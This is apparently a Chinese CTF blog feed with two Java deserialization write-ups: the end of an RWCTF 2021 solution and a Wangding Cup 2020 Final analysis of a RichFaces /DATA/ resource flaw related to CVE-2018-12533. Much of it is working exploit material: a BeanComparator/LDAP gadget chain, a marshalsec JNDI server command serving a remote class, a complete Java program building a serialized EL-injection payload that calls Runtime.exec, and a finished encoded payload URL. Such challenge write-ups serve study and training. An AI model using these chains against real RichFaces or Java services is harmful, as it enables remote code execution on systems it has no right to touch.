ldapAttributeClazzConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(<br><span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;name&quot;</span>&#125;);<br>        Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField(<span class="hljs-string">&quot;baseCtxURL&quot;</span>);<br>        baseCtxUrlField.setAccessible(<span class="hljs-keyword">true</span>);<br>        baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);<br>        Field rdnField = ldapAttributeClazz.getDeclaredField(<span class="hljs-string">&quot;rdn&quot;</span>);<br>        rdnField.setAccessible(<span class="hljs-keyword">true</span>);<br>        rdnField.set(ldapAttribute, <span class="hljs-keyword">new</span> CompositeName(<span class="hljs-string">&quot;a//b&quot;</span>));<br>        <br>BeanComparator comparator = <span class="hljs-keyword">new</span> BeanComparator(<span class="hljs-string">&quot;class&quot;</span>);<br>TreeMap tree1 = <span class="hljs-keyword">new</span> TreeMap(comparator);<br>tree1.put(ldapAttribute, <span class="hljs-keyword">null</span>);<br>TreeMap tree2 = <span class="hljs-keyword">new</span> TreeMap(comparator);<br>tree2.put(ldapAttribute, <span class="hljs-keyword">null</span>);<br>Hashtable hm = <span class="hljs-keyword">new</span> Hashtable();<br>hm.put(tree1, <span class="hljs-string">&quot;aaa&quot;</span>);<br>hm.put(tree2, <span class="hljs-string">&quot;bbb&quot;</span>);<br>    Field propertyField = BeanComparator.class.getDeclaredField(<span class="hljs-string">&quot;property&quot;</span>);<br>    propertyField.setAccessible(<span class="hljs-keyword">true</span>);<br>    propertyField.set(comparator, <span class="hljs-string">&quot;attributeDefinition&quot;</span>);<br>FileOutputStream fos = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;output/treemap.bin&quot;</span>);<br>ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(fos);<br>oos.writeObject(hm);<br>FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;output/treemap.bin&quot;</span>);<br>ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(fis);<br>Hashtable tr = (Hashtable)ois.readObject();<br>System.out.println(tr);<br><br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>起一个恶意的ldap服务</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar  marshalsec.jndi.LDAPRefServer <span class="hljs-string">&quot;http://127.0.0.1:8081/#exp&quot;</span> <span class="hljs-number">1389</span><br></code></pre></td></tr></table></figure><p>然后在相应的web服务上放一个编译后的exp.class(不能带有package,要用jdk1.4编译)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span> </span>&#123;<br><br><span class="hljs-keyword">static</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br>Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;);<br>&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br><span class="hljs-comment">// TODO Auto-generated catch block</span><br>e.printStackTrace();<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="https://i.loli.net/2021/02/15/meNOcUg35XrSsfP.png"></p><p>参考</p><p><a href="https://github.com/voidfyoo/rwctf-2021-old-system/tree/main/writeup">https://github.com/voidfyoo/rwctf-2021-old-system/tree/main/writeup</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java题目</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA反序列化题目-网鼎杯 2020 Final</title>
    <link href="/2021/02/19/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-Final/"/>
    <url>/2021/02/19/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-Final/</url>
    
    <content type="html"><![CDATA[<h1 id="JAVA反序列化题目-网鼎杯-2020-Final"><a href="#JAVA反序列化题目-网鼎杯-2020-Final" class="headerlink" title="JAVA反序列化题目-网鼎杯 2020 Final"></a>JAVA反序列化题目-网鼎杯 2020 Final</h1><h2 id="0x00-richfaces介绍"><a href="#0x00-richfaces介绍" class="headerlink" title="0x00 richfaces介绍"></a>0x00 richfaces介绍</h2><p><strong>RichFaces</strong>是一个开放源代码的JavaServer Faces组件库，帮助企业级Java应用程序集成AJAX相关的功能，由WildFly（原名JBoss）提供支援。</p><h2 id="0X01漏洞介绍"><a href="#0X01漏洞介绍" class="headerlink" title="0X01漏洞介绍"></a>0X01漏洞介绍</h2><p>richfaces有两种加载资源的方式，一种是在url里加<code>/DATB/</code>,一种是在url里加<code>/DATA/</code>，它们前面表示的是类位置，后面接有一些内容，在<code>DATA</code>后接的内容是经过序列化后的数据，可以构造出恶意的数据造成RCE</p><h3 id="例子一-DATB"><a href="#例子一-DATB" class="headerlink" title="例子一 :/DATB/"></a>例子一 :/DATB/</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span><span class="hljs-regexp">/wdb_war/</span>a4j<span class="hljs-regexp">/s/</span><span class="hljs-number">3</span>_3_1.BETA2<span class="hljs-regexp">/org/</span>richfaces<span class="hljs-regexp">/skin.xcss/</span>DATB/eAF7sqpgb-jyGdIAFrMEaw__.jsf<br></code></pre></td></tr></table></figure><p>重点在<code>ResourceBuilderImpl#getResourceDataForKey</code>,可以看到传进的key是<code>/org/richfaces/skin.xcss/DATB/eAF7sqpgb-jyGdIAFrMEaw__</code>,即去掉<code>/a4j/s/3_3_1.BETA2</code>和<code>.jsf</code>的字段。然后会进入正则匹配,而 匹配的就是<code>DATA_SEPARATOR_PATTERN = Pattern.compile(&quot;/DAT(A|B)/&quot;);</code>，是否存在<code>DATA</code>或<code>DATB</code>,然后截取到最后一个反斜杠后面的内容，进入到解码中</p><p><img src="https://i.loli.net/2021/02/11/uhi578adYZKfX3y.png"></p><p>先用<code>ISO-8859-1</code>获取字节，然后进入<code>decrypt</code>方法，好像是个zip解压缩（不是很清楚，不过也无事</p><p><img src="https://i.loli.net/2021/02/11/b5dSTBQs1lxuNoY.png"></p><p>再回到<code>ResourceBuilderImpl#getResourceDataForKey</code>,如果是<code>DATB</code>就直接返回数据，如果是<code>DATA</code>,还会进入反序列化中(这也是触发点)</p><p><img src="https://i.loli.net/2021/02/11/lDQqczGX56eRZOF.png"></p><h3 id="例子二-DATA"><a href="#例子二-DATA" class="headerlink" title="例子二: /DATA/"></a>例子二: /DATA/</h3><p>根据上面的截图，可以看到它实现了一个<code>ObjectInputStream</code>的子类，加入了一些白名单</p><p><img src="https://i.loli.net/2021/02/11/FxaP5XK9dAEN4Zz.png"></p><p>看到这个类的初始化代码,白名单里有一些基础类，再看到<code>loadwhitelist</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> &#123;<br>        PRIMITIVE_TYPES.put(<span class="hljs-string">&quot;bool&quot;</span>, Boolean.TYPE);<br>        PRIMITIVE_TYPES.put(<span class="hljs-string">&quot;byte&quot;</span>, Byte.TYPE);<br>        PRIMITIVE_TYPES.put(<span class="hljs-string">&quot;char&quot;</span>, Character.TYPE);<br>        PRIMITIVE_TYPES.put(<span class="hljs-string">&quot;short&quot;</span>, Short.TYPE);<br>        PRIMITIVE_TYPES.put(<span class="hljs-string">&quot;int&quot;</span>, Integer.TYPE);<br>        PRIMITIVE_TYPES.put(<span class="hljs-string">&quot;long&quot;</span>, Long.TYPE);<br>        PRIMITIVE_TYPES.put(<span class="hljs-string">&quot;float&quot;</span>, Float.TYPE);<br>        PRIMITIVE_TYPES.put(<span class="hljs-string">&quot;double&quot;</span>, Double.TYPE);<br>        PRIMITIVE_TYPES.put(<span class="hljs-string">&quot;void&quot;</span>, Void.TYPE);<br>        whitelistClassNameCache.put((<span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]).getClass().getName(), Boolean.TRUE);<br>        whitelistClassNameCache.put((<span class="hljs-keyword">new</span> String[<span class="hljs-number">0</span>]).getClass().getName(), Boolean.TRUE);<br>        whitelistClassNameCache.put((<span class="hljs-keyword">new</span> Boolean[<span class="hljs-number">0</span>]).getClass().getName(), Boolean.TRUE);<br>        whitelistClassNameCache.put((<span class="hljs-keyword">new</span> Byte[<span class="hljs-number">0</span>]).getClass().getName(), Boolean.TRUE);<br>        whitelistClassNameCache.put((<span class="hljs-keyword">new</span> Character[<span class="hljs-number">0</span>]).getClass().getName(), Boolean.TRUE);<br>        whitelistClassNameCache.put((<span class="hljs-keyword">new</span> Short[<span class="hljs-number">0</span>]).getClass().getName(), Boolean.TRUE);<br>        whitelistClassNameCache.put((<span class="hljs-keyword">new</span> Integer[<span class="hljs-number">0</span>]).getClass().getName(), Boolean.TRUE);<br>        whitelistClassNameCache.put((<span class="hljs-keyword">new</span> Long[<span class="hljs-number">0</span>]).getClass().getName(), Boolean.TRUE);<br>        whitelistClassNameCache.put((<span class="hljs-keyword">new</span> Float[<span class="hljs-number">0</span>]).getClass().getName(), Boolean.TRUE);<br>        whitelistClassNameCache.put((<span class="hljs-keyword">new</span> Double[<span class="hljs-number">0</span>]).getClass().getName(), Boolean.TRUE);<br>        whitelistClassNameCache.put((<span class="hljs-keyword">new</span> Void[<span class="hljs-number">0</span>]).getClass().getName(), Boolean.TRUE);<br>        whitelistBaseClasses.add(String.class);<br>        whitelistBaseClasses.add(Boolean.class);<br>        whitelistBaseClasses.add(Byte.class);<br>        whitelistBaseClasses.add(Character.class);<br>        whitelistBaseClasses.add(Number.class);<br>        loadWhitelist();<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">String whiteList = <span class="hljs-string">&quot;</span><br><span class="hljs-string">  org.ajax4jsf.resource.InternetResource,</span><br><span class="hljs-string">  org.ajax4jsf.resource.SerializableResource,</span><br><span class="hljs-string">javax.el.Expression,javax.faces.el.MethodBinding,</span><br><span class="hljs-string">javax.faces.component.StateHolderSaver,</span><br><span class="hljs-string">java.awt.Color,</span><br><span class="hljs-string">org.richfaces.renderkit.html.Paint2DResource$ImageData,</span><br><span class="hljs-string">org.richfaces.demo.paint2d.PaintData&quot;</span>;<br>        <br>        String[] var1 = whiteList.split(<span class="hljs-string">&quot;,&quot;</span>);<br>        <span class="hljs-keyword">int</span> var2 = var1.length;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> var3 = <span class="hljs-number">0</span>; var3 &lt; var2; ++var3) &#123;<br>            String baseClassName = var1[var3];<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                Class&lt;?&gt; baseClass = Class.forName(baseClassName);<br>                whitelistBaseClasses.add(baseClass);<br>            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var6) &#123;<br>            &#125;<br>        &#125;<br><br></code></pre></td></tr></table></figure><p>多了7个类，到时候反序列化要利用的类就在这里找了</p><p>回到<code>LookAheadObjectInputStream#resolveClass</code>,它又调用<code>isClassValid</code>,它判断一个类能不能被反序列化的条件是此类可以被强制转换为另外一个在白名单中的实例对象，即此类是否是白名单中某个类的子类或接口实现类，这样能大大增加我们可以利用的类，如果通过判断就能被正常反序列化了</p><p><img src="https://i.loli.net/2021/02/11/t13v5KomqclyxiR.png"></p><h2 id="0x02漏洞复现"><a href="#0x02漏洞复现" class="headerlink" title="0x02漏洞复现"></a>0x02漏洞复现</h2><p>在网上存在的CVE有<code>CVE-2018-14667</code>和<code>CVE-2018-12533</code>，我直接用了网上现成的exp都没能打成功，于是自己看了看代码，发现有几处修改了的地方，进而对exp加以修改，从而成功RCE</p><p>先上EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> wdb;<br><span class="hljs-keyword">import</span> org.jboss.el.ValueExpressionImpl;<br><span class="hljs-keyword">import</span> com.sun.facelets.el.LegacyMethodBinding;<br><span class="hljs-keyword">import</span> com.sun.facelets.el.TagMethodExpression;<br><span class="hljs-keyword">import</span> com.sun.facelets.tag.TagAttribute;<br><span class="hljs-keyword">import</span> com.sun.facelets.tag.Location;<br><span class="hljs-keyword">import</span> org.ajax4jsf.util.base64.URL64Codec;<br><span class="hljs-keyword">import</span> org.jboss.el.MethodExpressionImpl;<br><span class="hljs-keyword">import</span> org.richfaces.ui.application.StateMethodExpressionWrapper;<br><br><span class="hljs-keyword">import</span> javax.faces.context.FacesContext;<br><span class="hljs-keyword">import</span> javax.faces.el.MethodBinding;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><span class="hljs-keyword">import</span> java.util.zip.Deflater;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        String pocEL = <span class="hljs-string">&quot;#&#123;paintBean.paint &#125;&quot;</span>;<br>        String pocEL1 = <span class="hljs-string">&quot;#&#123;request.getClass().getClassLoader().loadClass(\&quot;java.lang.Runtime\&quot;).getMethod(\&quot;getRuntime\&quot;).invoke(null).exec(\&quot;calc\&quot;)&#125;&quot;</span>;<br>        Class cls = Class.forName(<span class="hljs-string">&quot;javax.faces.component.StateHolderSaver&quot;</span>);<br>        Constructor ct = cls.getDeclaredConstructor(FacesContext.class, Object.class);<br>        ct.setAccessible(<span class="hljs-keyword">true</span>);<br><br>        Location location = <span class="hljs-keyword">new</span> Location(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        TagAttribute tagAttribute = <span class="hljs-keyword">new</span> TagAttribute(location, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;createContent=&quot;</span>+pocEL);<br><br>        <span class="hljs-comment">// 1. 设置ImageData</span><br>        <span class="hljs-comment">//    构造ImageData_paint</span><br>        MethodExpressionImpl methodExpression = <span class="hljs-keyword">new</span> MethodExpressionImpl(pocEL, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Class[]&#123;OutputStream.class, Object.class&#125;);<br>        ValueExpressionImpl ValueExpression = <span class="hljs-keyword">new</span> ValueExpressionImpl(pocEL1,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br>        StateMethodExpressionWrapper StateMethodE = <span class="hljs-keyword">new</span> StateMethodExpressionWrapper(methodExpression,ValueExpression);<br>        TagMethodExpression tagMethodExpression = <span class="hljs-keyword">new</span> TagMethodExpression(tagAttribute, StateMethodE);<br>        MethodBinding methodBinding = <span class="hljs-keyword">new</span> LegacyMethodBinding(tagMethodExpression);<br>        Object _paint = ct.newInstance(<span class="hljs-keyword">null</span>, methodBinding);<br><br>        Class clzz = Class.forName(<span class="hljs-string">&quot;org.richfaces.renderkit.html.Paint2DResource&quot;</span>);<br>        Class innerClazz[] = clzz.getDeclaredClasses();<br>        <span class="hljs-keyword">for</span> (Class c : innerClazz)&#123;<br>            <span class="hljs-keyword">int</span> mod = c.getModifiers();<br>            String modifier = Modifier.toString(mod);<br>            <span class="hljs-keyword">if</span> (modifier.contains(<span class="hljs-string">&quot;private&quot;</span>))&#123;<br>                Constructor cc = c.getDeclaredConstructor();<br>                cc.setAccessible(<span class="hljs-keyword">true</span>);<br>                Object imageData = cc.newInstance(<span class="hljs-keyword">null</span>);<br><br>                <span class="hljs-comment">//    设置ImageData_width</span><br>                Field _widthField = imageData.getClass().getDeclaredField(<span class="hljs-string">&quot;_width&quot;</span>);<br>                _widthField.setAccessible(<span class="hljs-keyword">true</span>);<br>                _widthField.set(imageData, <span class="hljs-number">300</span>);<br><br>                <span class="hljs-comment">//    设置ImageData_height</span><br>                Field _heightField = imageData.getClass().getDeclaredField(<span class="hljs-string">&quot;_height&quot;</span>);<br>                _heightField.setAccessible(<span class="hljs-keyword">true</span>);<br>                _heightField.set(imageData, <span class="hljs-number">120</span>);<br><br>                <span class="hljs-comment">//    设置ImageData_data</span><br>                Field _dataField = imageData.getClass().getDeclaredField(<span class="hljs-string">&quot;_data&quot;</span>);<br>                _dataField.setAccessible(<span class="hljs-keyword">true</span>);<br>                _dataField.set(imageData, <span class="hljs-keyword">null</span>);<br><br>                <span class="hljs-comment">//    设置ImageData_format</span><br>                Field _formatField = imageData.getClass().getDeclaredField(<span class="hljs-string">&quot;_format&quot;</span>);<br>                _formatField.setAccessible(<span class="hljs-keyword">true</span>);<br>                _formatField.set(imageData, <span class="hljs-number">2</span>);<br><br>                <span class="hljs-comment">//    设置ImageData_paint</span><br>                Field _paintField = imageData.getClass().getDeclaredField(<span class="hljs-string">&quot;_paint&quot;</span>);<br>                _paintField.setAccessible(<span class="hljs-keyword">true</span>);<br>                _paintField.set(imageData, _paint);<br><br>                <span class="hljs-comment">//    设置ImageData_paint</span><br>                Field cacheableField = imageData.getClass().getDeclaredField(<span class="hljs-string">&quot;cacheable&quot;</span>);<br>                cacheableField.setAccessible(<span class="hljs-keyword">true</span>);<br>                cacheableField.set(imageData, <span class="hljs-keyword">false</span>);<br><br>                <span class="hljs-comment">//    设置ImageData_bgColor</span><br>                Field _bgColorField = imageData.getClass().getDeclaredField(<span class="hljs-string">&quot;_bgColor&quot;</span>);<br>                _bgColorField.setAccessible(<span class="hljs-keyword">true</span>);<br>                _bgColorField.set(imageData, <span class="hljs-number">0</span>);<br><br>                <br>                <span class="hljs-comment">// 2. 序列化</span><br>                ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>                ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>                objectOutputStream.writeObject(imageData);<br>                objectOutputStream.flush();<br>                objectOutputStream.close();<br>                byteArrayOutputStream.close();<br><br>                <span class="hljs-comment">// 3. 加密（zip+base64）</span><br>                <span class="hljs-keyword">byte</span>[] pocData = byteArrayOutputStream.toByteArray();<br>                Deflater compressor = <span class="hljs-keyword">new</span> Deflater(<span class="hljs-number">1</span>);<br>                <span class="hljs-keyword">byte</span>[] compressed = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[pocData.length + <span class="hljs-number">100</span>];<br>                compressor.setInput(pocData);<br>                compressor.finish();<br>                <span class="hljs-keyword">int</span> totalOut = compressor.deflate(compressed);<br>                <span class="hljs-keyword">byte</span>[] zipsrc = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[totalOut];<br>                System.arraycopy(compressed, <span class="hljs-number">0</span>, zipsrc, <span class="hljs-number">0</span>, totalOut);<br>                compressor.end();<br>                <span class="hljs-keyword">byte</span>[]dataArray = URL64Codec.encodeBase64(zipsrc);<br><br>                <span class="hljs-comment">// 4. 打印最后的poc</span><br>                String poc = <span class="hljs-string">&quot;/DATA/&quot;</span> + <span class="hljs-keyword">new</span> String(dataArray, <span class="hljs-string">&quot;ISO-8859-1&quot;</span>) + <span class="hljs-string">&quot;.jsf&quot;</span>;<br>                System.out.println(poc);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">/DATA/eAF1U89r1EAUnl2orW0P1RbrD4R1K3YrZbZ4EGpdkLaiC6mVrlTbHpbZ7Gsy7SSTTibd6FLRgxcvIsWbN09CC4L!gN5E8NK!QAURD0IRvKpvktqli-aSx-Sb7!ve9162vpOOUJGLUjlUcdtdZjaEVIFfB7XKNXW1J-hNxn19YXoOQhkpG86WPebANNOs9G7nc9!vl6-ypLNMuqo1Z0oKqcqks7oslce0qVzgjovVoWqD17W7SA7bzHaB1QRYpKNaRxpNjlorbJ0VBfOd4mxtBWw9YeGNwAivkfskEwckfbL4ignJjJIAfZ8z12KauralF0gffE0ryAnXpcAmKmwd1ML716XN5x9msiRrob5gYXiDeXBQt6IV9x3U7Q7xTj3h0ORY6ozLYgUUZ4LfM84n4sDID6MkDSM!MSBAhxQEtcBh9t0Z0K6sT3K!jqR73jNZkrFIxtPkVMIaF0EUU-DVOFAQhlz6SP0!<span class="hljs-number">5</span>lvMaUf!Ze7FVBQ5kcaBJtpxa9Zgz-KTT7sYH-L693Et3RePHld-LO5cNgjjYPzgSkScsiAQ3GYaTaYJt4vcVggBRQvPHl7amvuSpD1QYyGkI21paXKyFcA8ExG0vpnBBww3MBl8V2zG34N-csbPSk2GSchtl8peIMa3N7rvbOrhNIrj-y22QRvdD5Y-vvn11PRpuHsbTdIYaipYiyDU1AE9ZfajMLJfWpLhIuGBwCL9mDfs1KwrnYt8zT3IJ!g0kUIeWVrn3F-Xq1DwIyFGKMRgF!I2E3Z-ZIOQIIixtzMHemuP1TRX2x382fP2yIxpLkmkMUj6h5rJDzIJzKdJlUPGCMe7lKSb-ttb6-<span class="hljs-number">2</span>d-a!fTjevJePFrclqMpA0wSWdjXQQaQQCw93sa!WWzg09NkbJ-dyVsdGxXClvI0zDlPQ1zqj0Dw!<span class="hljs-number">5</span>-A9Rb3ui.jsf<br><br></code></pre></td></tr></table></figure><p>效果图</p><p><img src="https://i.loli.net/2021/02/11/XtLIMugNb8Vsicq.png"></p><h3 id="0x03漏洞调试"><a href="#0x03漏洞调试" class="headerlink" title="0x03漏洞调试"></a>0x03漏洞调试</h3><p>进入页面后，如果要利用<code>UserSources</code>进行RCE，要先点开<code>http://localhost:8080/wdb_war/richfaces/mediaOutput.jsf?c=mediaOutput&amp;tab=usage</code></p><p>这时会从<code>InternetResourceService#serviceResource</code>进入，<code>ResourceBuilderImpl#getResourceForKey</code>,然后获取类的路径，再进入getResource</p><p><img src="https://i.loli.net/2021/02/11/2j7u6UxAiVh9m4b.png"></p><p>在this.resources中找是否已经注册，如果没找到就报错，而如果刚启动服务就直接去触发rce，就会报错这样的报错，因为一开始这些类还没注册，那么他们在哪里注册进去呢？</p><p><img src="https://i.loli.net/2021/02/11/rRXQBKI15JHCM7T.png"></p><p><img src="https://i.loli.net/2021/02/11/WOdDQUBTLeIR5rK.png"></p><p>在<code>createDynamicResource</code>和<code>createUserResource</code>中有注册的操作</p><p>点开<code>http://localhost:8080/wdb_war/richfaces/mediaOutput.jsf?c=mediaOutput&amp;tab=usage</code>就会触发注册操作</p><p>大致调用栈</p><p><img src="https://i.loli.net/2021/02/11/U1dCfwRrgNpq6Ee.png"></p><h4 id="CVE-2018-14667失败原因"><a href="#CVE-2018-14667失败原因" class="headerlink" title="CVE-2018-14667失败原因"></a>CVE-2018-14667失败原因</h4><p>CVE-2018-14667利用的是<code>UserResource$UriData </code>,按照网上的分析文章，<code>UserResource$UriData</code>应该是实现了<code>org.ajax4jsf.resource.SerializableResource</code>接口，因此它也可以被反序列化，但是在这里它却是实现了<code>Serializable</code>接口，因此这条路就封死了</p><p><img src="https://i.loli.net/2021/02/11/p2dkYqJFfcP3R9o.png"></p><h4 id="CVE-2018-12533失败原因"><a href="#CVE-2018-12533失败原因" class="headerlink" title="CVE-2018-12533失败原因"></a>CVE-2018-12533失败原因</h4><p>CVE-2018-12533利用的是<code>paint2DResource$ImageData</code>,它正好在白名单中，<code>org.richfaces.renderkit.html.Paint2DResource$ImageData</code>,因此就他就能被利用，那么就一步步分析一下触发过程</p><p>直接来到反序列化的点</p><p>被反序列化的是<code>paint2DResource$ImageData</code>，然后还有很多被反序列化的类，这可以直接通过反序列化后的<code>IamgeData</code>里的变量进行查看</p><p><img src="https://i.loli.net/2021/02/11/wed2aJOogrxL9jE.png"></p><p>它里面最重要的属性就是<code>_paint</code></p><p><img src="https://i.loli.net/2021/02/11/ZaQD1794HesPNFX.png"></p><p>可以看到存在一个el表达式，这里就是我们要利用的点</p><p><img src="https://i.loli.net/2021/02/11/2uWqBzf56ySgwCP.png"></p><p>继续执行下去，查看触发el表达式执行的地方</p><p>回到<code>InternetResourceService#serviceResource</code>,在最后调用<code>ResourceLifecycle#send</code></p><p><img src="https://i.loli.net/2021/02/11/9JhtILMjSNl5Xuq.png"></p><p>进而调用<code>Paint2DResource#send</code></p><p><img src="https://i.loli.net/2021/02/11/wNkcKnRULsYF7oO.png"></p><p><code>Paint2DResource#send</code>,里先获取<code>Paint2DResource$ImageData</code>,然后获取paint属性，获取它的el表达式，进入正则匹配中，过滤了左括号和<code>getClass</code>，如果都不存在，就会执行<code>Invoke</code></p><p><img 